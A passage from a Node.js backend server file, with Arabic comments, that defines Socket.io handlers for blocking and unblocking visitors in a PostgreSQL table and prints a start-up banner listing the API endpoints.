    const { visitorId } = data;
    logger.info('Socket: Blocking visitor', { visitorId });
    
    try {
      await pool.query(
        'UPDATE visitors SET is_blocked = true WHERE id = $1',
        [visitorId]
      );
      io.to(visitorId).emit('blocked');
      logger.success('Socket: Visitor blocked', { visitorId });
    } catch (error) {
      logger.error('Socket: Error blocking visitor', error);
    }
  });

  // إلغاء حظر زائر
  socket.on('visitor:unblock', async (data) => {
    const { visitorId } = data;
    logger.info('Socket: Unblocking visitor', { visitorId });
    
    try {
      await pool.query(
        'UPDATE visitors SET is_blocked = false WHERE id = $1',
        [visitorId]
      );
      io.to(visitorId).emit('unblocked');
      logger.success('Socket: Visitor unblocked', { visitorId });
    } catch (error) {
      logger.error('Socket: Error unblocking visitor', error);
    }
  });

  socket.on('disconnect', () => {
    logger.info('Client disconnected from Socket.io', { socketId: socket.id });
  });
});

// تشغيل الخادم
httpServer.listen(PORT, () => {
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║     🚀 Backend API Server Started Successfully!             ║');
  console.log('╠════════════════════════════════════════════════════════════╣');
  console.log(`║  📍 Server URL:     http://localhost:${PORT}                    ║`);
  console.log(`║  📍 API Base URL:    http://localhost:${PORT}/api              ║`);
  console.log(`║  🔌 Socket.io:      Enabled                               ║`);
  console.log(`║  🗄️  Database:       PostgreSQL (Supabase)                  ║`);
  console.log(`║  🌐 Client URL:      ${CLIENT_URL.substring(0, 30).padEnd(30)}  ║`);
  console.log('╠════════════════════════════════════════════════════════════╣');
  console.log('║  📊 Available Endpoints:                                   ║');
  console.log('║     GET  /api/visitors          - List all visitors      ║');
  console.log('║     GET  /api/visitors/:id      - Get visitor           ║');
  console.log('║     PATCH /api/visitors/:id      - Update visitor        ║');
  console.log('║     GET  /api/stats              - Dashboard stats       ║');
  console.log('║     GET  /api/health             - Health check          ║');
  console.log('╠════════════════════════════════════════════════════════════╣');
  console.log('║  💡 Waiting for requests...                              ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');
});
